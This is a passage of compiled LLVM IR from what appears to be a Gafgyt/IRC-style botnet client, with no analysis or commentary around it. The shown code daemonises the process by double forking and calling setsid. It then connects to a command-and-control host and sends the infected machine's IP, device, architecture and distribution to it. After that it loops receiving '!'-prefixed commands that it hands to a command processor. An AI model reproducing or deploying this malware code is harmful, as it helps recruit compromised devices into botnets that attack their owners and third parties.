  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #11
  store i32 6982, i32* %3, align 4
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %27 = call i8* @strchr(i8* %26, i32 58) #12
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

29:                                               ; preds = %19
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %31 = call i8* @strchr(i8* %30, i32 58) #12
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #12
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %35 = call i8* @strchr(i8* %34, i32 58) #12
  store i8 0, i8* %35, align 1
  br label %36

36:                                               ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #11
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

43:                                               ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

44:                                               ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

45:                                               ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: nounwind readonly willreturn
declare i8* @strchr(i8*, i32) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [4096 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca [10 x i8*], align 16
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %23 = call i32 @getpid() #11
  %24 = xor i32 %22, %23
  call void @srand(i32 %24) #11
  %25 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %26 = call i32 @getpid() #11
  %27 = xor i32 %25, %26
  call void @init_rand(i32 %27)
  %28 = call i32 @getOurIP()
  %29 = call i32 @fork() #11
  store i32 %29, i32* %6, align 4
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %34

31:                                               ; preds = %2
  %32 = load i32, i32* %6, align 4
  %33 = call i32 @waitpid(i32 %32, i32* %8, i32 0)
  call void @exit(i32 0) #14
  unreachable

34:                                               ; preds = %2
  %35 = load i32, i32* %6, align 4
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %48, label %37

37:                                               ; preds = %34
  %38 = call i32 @fork() #11
  store i32 %38, i32* %7, align 4
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %37
  call void @exit(i32 0) #14
  unreachable

41:                                               ; preds = %37
  %42 = load i32, i32* %7, align 4
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %45, label %44

44:                                               ; preds = %41
  br label %46

45:                                               ; preds = %41
  br label %46

46:                                               ; preds = %45, %44
  br label %47

47:                                               ; preds = %46
  br label %49

48:                                               ; preds = %34
  br label %49

49:                                               ; preds = %48, %47
  br label %50

50:                                               ; preds = %49
  %51 = call i32 @setsid() #11
  %52 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #11
  %53 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #11
  br label %54

54:                                               ; preds = %50, %57, %312
  %55 = call i32 @initConnection()
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %59

57:                                               ; preds = %54
  %58 = call i32 @sleep(i32 5)
  br label %54

59:                                               ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %62 = call i8* @inet_ntoa(i32 %61) #11
  %63 = call i8* @getPortz()
  %64 = call i8* @getDevice()
  %65 = call i8* @getFiles()
  %66 = call i8* @getArch()
  %67 = call i8* @getDistro()
  %68 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([242 x i8], [242 x i8]* @.str.44, i64 0, i64 0), i8* %62, i8* %63, i8* %64, i8* %65, i8* %66, i8* %67)
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  br label %69

69:                                               ; preds = %311, %182, %59
  %70 = load i32, i32* @mainCommSock, align 4
  %71 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %72 = call i32 @recvLine(i32 %70, i8* %71, i32 4096)
  store i32 %72, i32* %10, align 4
  %73 = icmp ne i32 %72, -1
  br i1 %73, label %74, label %312

74:                                               ; preds = %69
  store i32 0, i32* %11, align 4
  br label %75

75:                                               ; preds = %146, %74
  %76 = load i32, i32* %11, align 4
  %77 = sext i32 %76 to i64
  %78 = load i64, i64* @numpids, align 8
  %79 = icmp ult i64 %77, %78
  br i1 %79, label %80, label %149

80:                                               ; preds = %75
  %81 = load i32*, i32** @pids, align 8
  %82 = load i32, i32* %11, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i32, i32* %81, i64 %83
  %85 = load i32, i32* %84, align 4
  %86 = call i32 @waitpid(i32 %85, i32* null, i32 1)
  %87 = icmp sgt i32 %86, 0
  br i1 %87, label %88, label %145

88:                                               ; preds = %80
  %89 = load i32, i32* %11, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %13, align 4
  br label %91

91:                                               ; preds = %107, %88
  %92 = load i32, i32* %13, align 4
  %93 = zext i32 %92 to i64
  %94 = load i64, i64* @numpids, align 8
  %95 = icmp ult i64 %93, %94
  br i1 %95, label %96, label %110

96:                                               ; preds = %91
  %97 = load i32*, i32** @pids, align 8
  %98 = load i32, i32* %13, align 4
  %99 = zext i32 %98 to i64
  %100 = getelementptr inbounds i32, i32* %97, i64 %99
  %101 = load i32, i32* %100, align 4
  %102 = load i32*, i32** @pids, align 8
  %103 = load i32, i32* %13, align 4
  %104 = sub i32 %103, 1
  %105 = zext i32 %104 to i64
  %106 = getelementptr inbounds i32, i32* %102, i64 %105
  store i32 %101, i32* %106, align 4
  br label %107

107:                                              ; preds = %96
  %108 = load i32, i32* %13, align 4
  %109 = add i32 %108, 1
  store i32 %109, i32* %13, align 4
  br label %91, !llvm.loop !42

110:                                              ; preds = %91
  %111 = load i32*, i32** @pids, align 8
  %112 = load i32, i32* %13, align 4
  %113 = sub i32 %112, 1
  %114 = zext i32 %113 to i64
  %115 = getelementptr inbounds i32, i32* %111, i64 %114
  store i32 0, i32* %115, align 4
  %116 = load i64, i64* @numpids, align 8
  %117 = add i64 %116, -1
  store i64 %117, i64* @numpids, align 8
  %118 = load i64, i64* @numpids, align 8
  %119 = add i64 %118, 1
  %120 = mul i64 %119, 4
  %121 = call noalias align 16 i8* @malloc(i64 %120) #11
  %122 = bitcast i8* %121 to i32*
  store i32* %122, i32** %12, align 8
  store i32 0, i32* %13, align 4
  br label %123

123:                                              ; preds = %138, %110
  %124 = load i32, i32* %13, align 4
  %125 = zext i32 %124 to i64
  %126 = load i64, i64* @numpids, align 8
  %127 = icmp ult i64 %125, %126
  br i1 %127, label %128, label %141

128:                                              ; preds = %123
  %129 = load i32*, i32** @pids, align 8
  %130 = load i32, i32* %13, align 4
  %131 = zext i32 %130 to i64
  %132 = getelementptr inbounds i32, i32* %129, i64 %131
  %133 = load i32, i32* %132, align 4
  %134 = load i32*, i32** %12, align 8
  %135 = load i32, i32* %13, align 4
  %136 = zext i32 %135 to i64
  %137 = getelementptr inbounds i32, i32* %134, i64 %136
  store i32 %133, i32* %137, align 4
  br label %138

138:                                              ; preds = %128
  %139 = load i32, i32* %13, align 4
  %140 = add i32 %139, 1
  store i32 %140, i32* %13, align 4
  br label %123, !llvm.loop !43

141:                                              ; preds = %123
  %142 = load i32*, i32** @pids, align 8
  %143 = bitcast i32* %142 to i8*
  call void @free(i8* %143) #11
  %144 = load i32*, i32** %12, align 8
  store i32* %144, i32** @pids, align 8
  br label %145

145:                                              ; preds = %141, %80
  br label %146

146:                                              ; preds = %145
  %147 = load i32, i32* %11, align 4
  %148 = add nsw i32 %147, 1
  store i32 %148, i32* %11, align 4
  br label %75, !llvm.loop !44

149:                                              ; preds = %75
  %150 = load i32, i32* %10, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %151
  store i8 0, i8* %152, align 1
  %153 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %153)
  %154 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  store i8* %154, i8** %14, align 8
  %155 = load i8*, i8** %14, align 8
  %156 = load i8, i8* %155, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 33
  br i1 %158, label %159, label %311

159:                                              ; preds = %149
  %160 = load i8*, i8** %14, align 8
  %161 = getelementptr inbounds i8, i8* %160, i64 1
  store i8* %161, i8** %15, align 8
  br label %162

162:                                              ; preds = %174, %159
  %163 = load i8*, i8** %15, align 8
  %164 = load i8, i8* %163, align 1
  %165 = zext i8 %164 to i32
  %166 = icmp ne i32 %165, 32
  br i1 %166, label %167, label %172

167:                                              ; preds = %162
  %168 = load i8*, i8** %15, align 8
  %169 = load i8, i8* %168, align 1
  %170 = zext i8 %169 to i32
  %171 = icmp ne i32 %170, 0
  br label %172

172:                                              ; preds = %167, %162
  %173 = phi i1 [ false, %162 ], [ %171, %167 ]
  br i1 %173, label %174, label %177

174:                                              ; preds = %172
  %175 = load i8*, i8** %15, align 8
  %176 = getelementptr inbounds i8, i8* %175, i32 1
  store i8* %176, i8** %15, align 8
  br label %162, !llvm.loop !45

177:                                              ; preds = %172
  %178 = load i8*, i8** %15, align 8
  %179 = load i8, i8* %178, align 1
  %180 = zext i8 %179 to i32
  %181 = icmp eq i32 %180, 0
  br i1 %181, label %182, label %183

182:                                              ; preds = %177
  br label %69, !llvm.loop !46

183:                                              ; preds = %177
  %184 = load i8*, i8** %15, align 8
  store i8 0, i8* %184, align 1
  %185 = load i8*, i8** %14, align 8
  %186 = getelementptr inbounds i8, i8* %185, i64 1
  store i8* %186, i8** %15, align 8
  %187 = load i8*, i8** %14, align 8
  %188 = load i8*, i8** %15, align 8
  %189 = call i64 @strlen(i8* %188) #12
  %190 = getelementptr inbounds i8, i8* %187, i64 %189
  %191 = getelementptr inbounds i8, i8* %190, i64 2
  store i8* %191, i8** %14, align 8
  br label %192

192:                                              ; preds = %212, %183
  %193 = load i8*, i8** %14, align 8
  %194 = load i8*, i8** %14, align 8
  %195 = call i64 @strlen(i8* %194) #12
  %196 = sub i64 %195, 1
  %197 = getelementptr inbounds i8, i8* %193, i64 %196
  %198 = load i8, i8* %197, align 1
  %199 = zext i8 %198 to i32
  %200 = icmp eq i32 %199, 10
  br i1 %200, label %210, label %201

201:                                              ; preds = %192
  %202 = load i8*, i8** %14, align 8
  %203 = load i8*, i8** %14, align 8
  %204 = call i64 @strlen(i8* %203) #12
  %205 = sub i64 %204, 1
  %206 = getelementptr inbounds i8, i8* %202, i64 %205
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 13
  br label %210

210:                                              ; preds = %201, %192
  %211 = phi i1 [ true, %192 ], [ %209, %201 ]
  br i1 %211, label %212, label %218

212:                                              ; preds = %210
  %213 = load i8*, i8** %14, align 8
  %214 = load i8*, i8** %14, align 8
  %215 = call i64 @strlen(i8* %214) #12
  %216 = sub i64 %215, 1
  %217 = getelementptr inbounds i8, i8* %213, i64 %216
  store i8 0, i8* %217, align 1
  br label %192, !llvm.loop !47

218:                                              ; preds = %210
  %219 = load i8*, i8** %14, align 8
  store i8* %219, i8** %16, align 8
  br label %220

220:                                              ; preds = %232, %218
  %221 = load i8*, i8** %14, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp ne i32 %223, 32
  br i1 %224, label %225, label %230

225:                                              ; preds = %220
  %226 = load i8*, i8** %14, align 8
  %227 = load i8, i8* %226, align 1
  %228 = zext i8 %227 to i32
  %229 = icmp ne i32 %228, 0
  br label %230

230:                                              ; preds = %225, %220
  %231 = phi i1 [ false, %220 ], [ %229, %225 ]
  br i1 %231, label %232, label %235

232:                                              ; preds = %230
  %233 = load i8*, i8** %14, align 8
  %234 = getelementptr inbounds i8, i8* %233, i32 1
  store i8* %234, i8** %14, align 8
  br label %220, !llvm.loop !48

235:                                              ; preds = %230
  %236 = load i8*, i8** %14, align 8
  store i8 0, i8* %236, align 1
  %237 = load i8*, i8** %14, align 8
  %238 = getelementptr inbounds i8, i8* %237, i32 1
  store i8* %238, i8** %14, align 8
  %239 = load i8*, i8** %16, align 8
  store i8* %239, i8** %17, align 8
  br label %240

240:                                              ; preds = %244, %235
  %241 = load i8*, i8** %17, align 8
  %242 = load i8, i8* %241, align 1
  %243 = icmp ne i8 %242, 0
  br i1 %243, label %244, label %253

244:                                              ; preds = %240
  %245 = load i8*, i8** %17, align 8
  %246 = load i8, i8* %245, align 1
  %247 = zext i8 %246 to i32
  %248 = call i32 @toupper(i32 %247) #12
  %249 = trunc i32 %248 to i8
  %250 = load i8*, i8** %17, align 8
  store i8 %249, i8* %250, align 1
  %251 = load i8*, i8** %17, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %17, align 8
  br label %240, !llvm.loop !49

253:                                              ; preds = %240
  store i32 1, i32* %19, align 4
  %254 = load i8*, i8** %14, align 8
  %255 = call i8* @strtok(i8* %254, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i64 0, i64 0)) #11
  store i8* %255, i8** %20, align 8
  %256 = load i8*, i8** %16, align 8
  %257 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 0
  store i8* %256, i8** %257, align 16
  br label %258

258:                                              ; preds = %289, %253
  %259 = load i8*, i8** %20, align 8
  %260 = icmp ne i8* %259, null
  br i1 %260, label %261, label %291

261:                                              ; preds = %258
  %262 = load i8*, i8** %20, align 8
  %263 = load i8, i8* %262, align 1
  %264 = zext i8 %263 to i32
  %265 = icmp ne i32 %264, 10
  br i1 %265, label %266, label %289

266:                                              ; preds = %261
  %267 = load i8*, i8** %20, align 8
  %268 = call i64 @strlen(i8* %267) #12
  %269 = add i64 %268, 1
  %270 = call noalias align 16 i8* @malloc(i64 %269) #11
  %271 = load i32, i32* %19, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %272
  store i8* %270, i8** %273, align 8
  %274 = load i32, i32* %19, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %275
  %277 = load i8*, i8** %276, align 8
  %278 = load i8*, i8** %20, align 8
  %279 = call i64 @strlen(i8* %278) #12
  %280 = add i64 %279, 1
  call void @llvm.memset.p0i8.i64(i8* align 1 %277, i8 0, i64 %280, i1 false)
  %281 = load i32, i32* %19, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %282
  %284 = load i8*, i8** %283, align 8
  %285 = load i8*, i8** %20, align 8
  %286 = call i8* @strcpy(i8* %284, i8* %285) #11
  %287 = load i32, i32* %19, align 4
  %288 = add nsw i32 %287, 1
  store i32 %288, i32* %19, align 4
  br label %289

289:                                              ; preds = %266, %261
  %290 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i64 0, i64 0)) #11
  store i8* %290, i8** %20, align 8
  br label %258, !llvm.loop !50

291:                                              ; preds = %258
  %292 = load i32, i32* %19, align 4
  %293 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 0
  call void @processCmd(i32 %292, i8** %293)
  %294 = load i32, i32* %19, align 4
  %295 = icmp sgt i32 %294, 1
  br i1 %295, label %296, label %310

296:                                              ; preds = %291
  store i32 1, i32* %21, align 4
  store i32 1, i32* %21, align 4
  br label %297

297:                                              ; preds = %306, %296
  %298 = load i32, i32* %21, align 4
  %299 = load i32, i32* %19, align 4
  %300 = icmp slt i32 %298, %299
  br i1 %300, label %301, label %309

301:                                              ; preds = %297
  %302 = load i32, i32* %21, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %303
  %305 = load i8*, i8** %304, align 8
  call void @free(i8* %305) #11
  br label %306

306:                                              ; preds = %301
  %307 = load i32, i32* %21, align 4
  %308 = add nsw i32 %307, 1
  store i32 %308, i32* %21, align 4
  br label %297, !llvm.loop !51

309:                                              ; preds = %297
  br label %310

310:                                              ; preds = %309, %291
  br label %311

311:                                              ; preds = %310, %149
  br label %69, !llvm.loop !46

312:                                              ; preds = %69
  br label %54
}

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: nounwind
declare i32 @setsid() #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: nounwind readonly willreturn
declare i32 @toupper(i32) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @prints(i8** %0, i8* %1, i32 %2, i32 %3) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

15:                                               ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

17:                                               ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

21:                                               ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

24:                                               ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17, !llvm.loop !52

27:                                               ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

31:                                               ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

32:                                               ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

36:                                               ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

41:                                               ; preds = %40, %36
  br label %42

42:                                               ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

46:                                               ; preds = %42
  br label %47

47:                                               ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

50:                                               ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

55:                                               ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47, !llvm.loop !53

58:                                               ; preds = %47
  br label %59

59:                                               ; preds = %58, %42
  br label %60

60:                                               ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

64:                                               ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

71:                                               ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60, !llvm.loop !54

74:                                               ; preds = %60
  br label %75

75:                                               ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

78:                                               ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

83:                                               ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75, !llvm.loop !55

86:                                               ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @printi(i8** %0, i32 %1, i32 %2, i32 %3, i32 %4, i32 %5, i32 %6) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

25:                                               ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

33:                                               ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

36:                                               ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

39:                                               ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

42:                                               ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

45:                                               ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

50:                                               ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

53:                                               ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

59:                                               ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

65:                                               ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50, !llvm.loop !56

74:                                               ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

77:                                               ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

80:                                               ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

84:                                               ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

90:                                               ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

93:                                               ; preds = %90, %84
  br label %94

94:                                               ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

102:                                              ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @printchar(i8** %0, i32 %1) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

7:                                                ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

15:                                               ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

18:                                               ; preds = %15, %7
  ret void
}

declare i64 @write(i32, i8*, i64) #2

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
